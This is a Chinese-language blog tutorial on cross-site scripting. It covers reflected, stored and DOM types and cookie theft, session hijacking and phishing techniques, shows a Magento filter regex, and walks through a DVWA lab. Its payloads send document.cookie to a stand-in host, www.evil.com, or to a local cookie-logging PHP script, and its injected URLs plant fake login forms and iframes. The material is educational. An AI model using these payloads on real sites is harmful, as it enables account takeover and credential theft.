<!DOCTYPE html>
<html>
<head hexo-theme='https://volantis.js.org/#'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <!-- 页面元数据 -->
  
    <title>【XSS（一）】1.1 XSS介绍与原理 - fishni</title>
  
    <meta name="keywords" content="PHP,XSS">
  
  
    <meta name="description" content="本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。">
  

  <!-- feed -->
  

  <!-- import meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css">
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">

  

  
  <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/xaoxuu/assets@master/favicon/favicon.ico">
  

  

  <!-- import link -->
  

  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.2.1/css/style.css">

  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
</head>

<body>
  
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<header class="l_header shadow blur">

  <div class='wrapper'>
    <div class='nav-sub'>
      <a class="logo flat-box"></a>
      <ul class='switcher h-list'>
        <li><a class="s-comment flat-btn fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a class="s-toc flat-btn fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="logo flat-box" target="_self" href='/'>
          
          
          
          
            FISHNI'S BLOG <b><sup style='color:#3AA757'></sup></b>
          
        </a>
      

      

			<div class='menu navigation'>
				<ul class='h-list'>
          
          
          
            
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  
                    <i class='fas fa-rss fa-fw'></i>
                  
                  主页
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  
                    <i class='fas fa-folder-open fa-fw'></i>
                  
                  分类
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  
                    <i class='fas fa-tags fa-fw'></i>
                  
                  标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  
                    <i class='fas fa-archive fa-fw'></i>
                  
                  归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  
                    <i class='fas fa-info-circle fa-fw'></i>
                  
                  更多
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      
        <div class="m_search">
          <form name="searchform" class="form u-search-form">
            <i class="icon fas fa-search fa-fw"></i>
            <input type="text" class="input u-search-input" placeholder="搜索" />
          </form>
        </div>
      

			<ul class='switcher h-list'>
				
					<li><a class="s-search flat-btn fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li><a class="s-menu flat-btn fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a></li>
			</ul>
		</div>
	</div>
</header>
<ul class="menu-phone navigation white-box">
  
  
    <li>
      <a class="flat-box" href=/
        
        
        
          id="home"
        >
        
          <i class='fas fa-rss fa-fw'></i>
        
        主页
      </a>
    </li>
  
    <li>
      <a class="flat-box" href=/categories/
        
        
        
          id="categories"
        >
        
          <i class='fas fa-folder-open fa-fw'></i>
        
        分类
      </a>
    </li>
  
    <li>
      <a class="flat-box" href=/tags/
        
        
        
          id="tags"
        >
        
          <i class='fas fa-tags fa-fw'></i>
        
        标签
      </a>
    </li>
  
    <li>
      <a class="flat-box" href=/archives/
        
        
        
          id="archives"
        >
        
          <i class='fas fa-archive fa-fw'></i>
        
        归档
      </a>
    </li>
  
</ul>
<script>setLoadingBarProgress(40);</script>



  <div class="l_body nocover">
    <div class='body-wrapper'>
      

<div class='l_main'>
  

  
    <article id="post" class="post white-box shadow article-type-post" itemscope itemprop="blogPost">
      


  <section class='meta'>
    
    
    <div class="meta" id="header-meta">
      
        
  
    <h1 class="title">
      <a href="/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/">
        【XSS（一）】1.1 XSS介绍与原理
      </a>
    </h1>
  


      
      <div class='new-meta-box'>
        
          
        
          
            
<div class='new-meta-item author'>
  <a href="https://fishni.github.io/" rel="nofollow">
    <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/ghost1.jpg">
    <p>fishni</p>
  </a>
</div>

          
        
          
            
  
  <div class='new-meta-item category'>
    <a href='/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>网络安全&nbsp;/&nbsp;Web安全</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：2020年4月6日</p>
  </a>
</div>

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


      <section class="article typo">
        <div class="article-entry" itemprop="articleBody">
          
          <p>本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。</p>
<a id="more"></a>

<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="1-1-XSS简介"><a href="#1-1-XSS简介" class="headerlink" title="1.1 XSS简介"></a>1.1 XSS简介</h3><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序<strong>对用户的输入过滤不足</strong>而产生的。攻击者利用网站漏洞把<strong>恶意的脚本代码注入</strong>到网页中，当<strong>其他用户</strong>浏览这些网页时，就会<strong>执行其中的恶意代码</strong>，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击 </p>
<p> <strong>关键点：</strong> </p>
<p>目标网站的目标用户</p>
<ul>
<li>浏览器</li>
<li>不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时<strong>被浏览器解析执行</strong></li>
<li>“跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。</li>
</ul>
<p><strong>总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行</strong></p>
<h3 id="1-2-XSS分类"><a href="#1-2-XSS分类" class="headerlink" title="1.2 XSS分类"></a>1.2 XSS分类</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><ul>
<li><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
</li>
<li><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
</li>
<li><p>服务器端代码： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>  可以看到，代码直接引用了 <code>name</code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 </p>
</li>
</ul>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><ul>
<li><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
</li>
<li><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
</li>
<li><p>服务器端代码： </p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">//mysql_close(); &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>   代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 </p>
</li>
</ul>
<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><ul>
<li><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 </p>
</li>
<li><p>HTML 代码： </p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> a=<span class="built_in">document</span>.URL;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.write(a.substring(a.indexOf(<span class="string">"a="</span>)+<span class="number">2</span>,a.length));</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>   将代码保存在 domXSS.html 中，浏览器访问： </p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>  DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</p>
</li>
</ul>
<h3 id="1-3-XSS-利用方式"><a href="#1-3-XSS-利用方式" class="headerlink" title="1.3 XSS 利用方式"></a>1.3 XSS 利用方式</h3><h4 id="Cookies-窃取"><a href="#Cookies-窃取" class="headerlink" title="Cookies 窃取"></a>Cookies 窃取</h4><ul>
<li><p>攻击者可以使用以下代码获取客户端的 Cookies 信息 ：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.location=<span class="string">"http://www.evil.com/cookie.asp?cookie="</span>+<span class="built_in">document</span>.cookie</span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://www.evil.com/cookie.asp?cookie="</span>+<span class="built_in">document</span>.cookie</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src="http:/</span><span class="regexp">/www.evil.com/</span>cookie.asp?cookie=<span class="string">"+document.cookie&gt;&lt;/img&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs&#x3D;nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($log, $cookie . <span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。 </p>
<h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4></li>
<li><p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。<strong>会话劫持的本质</strong>是在攻击中带上了 Cookies 并发送到了服务端。</p>
</li>
<li><p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到<strong>提升权限</strong>的目的。 </p>
</li>
<li><p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。 </p>
</li>
</ul>
<h4 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h4><ul>
<li><p>重定向钓鱼</p>
<p>把当前页面重定向到一个钓鱼页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTML 注入式钓鱼</p>
<p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p> 该段代码会在正常页面中嵌入一个 Form 表单。 </p>
</li>
<li><p>iframe 钓鱼 </p>
<p>这种方式是通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Flash 钓鱼 </p>
<p>将构造好的 Flash 文件传入服务器，在目标网站用 <code>&lt;object&gt;  或   &lt;embed&gt;</code> 标签引用即可。 </p>
</li>
<li><p>高级钓鱼技术 </p>
<p> 注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。 </p>
</li>
</ul>
<h4 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h4><p> 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用  <code>&lt;iframe&gt;</code>  标签 </p>
<h4 id="DOS-与-DDOS¶"><a href="#DOS-与-DDOS¶" class="headerlink" title="DOS 与 DDOS¶"></a>DOS 与 DDOS<a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#dos-ddos" target="_blank" rel="noopener">¶</a></h4><p>注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</p>
<h4 id="XSS-蠕虫-¶"><a href="#XSS-蠕虫-¶" class="headerlink" title="XSS 蠕虫 ¶"></a>XSS 蠕虫 <a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#xss_4" target="_blank" rel="noopener">¶</a></h4><p>通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
<h4 id="Self-XSS-变废为宝的场景-¶"><a href="#Self-XSS-变废为宝的场景-¶" class="headerlink" title="Self-XSS 变废为宝的场景 ¶"></a>Self-XSS 变废为宝的场景 <a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#self-xss" target="_blank" rel="noopener">¶</a></h4><p>Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。</p>
<ul>
<li>登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录</li>
</ul>
<p>这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作：</p>
<ol>
<li>恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload</li>
<li>JavaScript Payload 生成  <code>&lt;iframe&gt;</code>  标签，并在框架内执行以下这些操作</li>
<li>让受害者登出攻击者的账号</li>
<li>然后使得受害者通过 CSRF 登录到自己的账户个人信息界面</li>
<li>攻击者从页面提取 CSRF Token</li>
<li>然后可以使用 CSRF Token 提交修改用户的个人信息</li>
</ol>
<p>这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；<strong>X-Frame-Options</strong> 需要被设置为同源（该页面可以在相同域名页面的 <code>iframe</code> 中展示 ）</p>
<ul>
<li><p>登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证</p>
</li>
<li><p>让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面</p>
</li>
<li><p>让用户登录我们的账户页面出现 XSS，利用 使用   <code>&lt;iframe&gt;</code>  标签等执行恶意代码</p>
</li>
<li><p>登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session</p>
</li>
</ul>
<h3 id="1-4-正则表达式规则"><a href="#1-4-正则表达式规则" class="headerlink" title="1.4 正则表达式规则"></a>1.4 正则表达式规则</h3><p> 以一个网上商城应用 <a href="https://magento.com/" target="_blank" rel="noopener">Magento</a> 中的过滤类 <a href="https://github.com/nexcess/magento/blob/master/app/code/core/Mage/Core/Model/Input/Filter/MaliciousCode.php" target="_blank" rel="noopener">Mage_Core_Model_Input_Filter_MaliciousCode</a> 为例，部分代码如下： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $_expressions = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'/(\/\*.*\*\/)/Us'</span>,</span><br><span class="line">    <span class="string">'/(\t)/'</span>,</span><br><span class="line">    <span class="string">'/(javascript\s*:)/Usi'</span>,</span><br><span class="line">    <span class="string">'/(@import)/Usi'</span>,</span><br><span class="line">    <span class="string">'/style=[^&lt;]*((expression\s*?\([^&lt;]*?\))|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">    <span class="string">'/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">    <span class="string">'/&lt;\/?(script|meta|link|frame|iframe).*&gt;/Uis'</span>,</span><br><span class="line">    <span class="string">'/src=[^&lt;]*base64[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;_expressions, <span class="string">''</span>, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 <code>&lt;script&gt;foo&lt;/script&gt;</code> 时，两个标签都会被移除而只剩下 foo。</p>
<h2 id="0x02-简单实例分析"><a href="#0x02-简单实例分析" class="headerlink" title="0x02 简单实例分析"></a>0x02 简单实例分析</h2><p>以下三个类型的实例，环境为DVWA平台，系统为windows</p>
<h3 id="2-1-反射型XSS-Low等级"><a href="#2-1-反射型XSS-Low等级" class="headerlink" title="2.1 反射型XSS-Low等级"></a>2.1 反射型XSS-Low等级</h3><ul>
<li><strong>先利用alert测试是否存在xss</strong> </li>
</ul>
<p>  <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss01.png" alt=""></p>
<p>出现弹窗，说明存在xss漏洞</p>
<ul>
<li><p>源码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源码，观察，直接使用name参数，并未进行任何过滤和检查，故存在xss漏洞</p>
</li>
<li><p><strong>编写PHP文档获取页面的cookie：</strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>编写js代码将页面的cookie发送到cookie.php中</strong> </p>
<p>当在火狐浏览器中在，以下位置输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>并点击提交，页面跳转，说明执行了js代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss03.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
</li>
<li><p>跳转至下页面，并打开cookie.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss04.png" alt=""></p>
</li>
<li><p><strong>如上图，表示成功拿到cookie</strong>，也就可以通过cookie登陆dvwa</p>
</li>
<li><p>js代码分析： document.location</p>
<p> <strong>[document 对象]</strong> :该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档 </p>
